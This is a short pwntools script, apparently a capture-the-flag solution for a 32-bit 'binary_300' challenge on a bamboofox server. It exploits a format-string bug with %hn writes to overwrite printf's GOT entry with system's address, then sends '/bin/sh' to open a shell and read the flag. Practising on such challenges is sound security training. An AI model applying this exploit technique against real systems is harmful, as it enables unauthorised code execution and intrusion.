#!/usr/bin/env python
from pwn import *

context.arch = "i386"
context.os   = "linux"
context.bits = 32

# DEBUG = True
DEBUG = False
if DEBUG:
	p = process("binary_300")
else:
	p = remote("bamboofox.cs.nctu.edu.tw",22003)

printf_got  = 0x804a00c
system_addr = 0x8048410

payload1  = p32(printf_got)
payload1 += p32(printf_got+2)
payload1 += "%" + str(0x8410 - 0x4*2) + "c" # "x"
payload1 += "%7$hn"
payload1 += "%" + str(0x10804 - 0x8410) + "c" # "x"
payload1 += "%8$hn"

payload2 = "/bin/sh\x00"


p.sendline(payload1)

if not DEBUG:
	p.recvline()
	p.sendline(payload2)

	p.sendline("cd /home/ctf")
	p.sendline("cat flag")

p.interactive()
p.close()
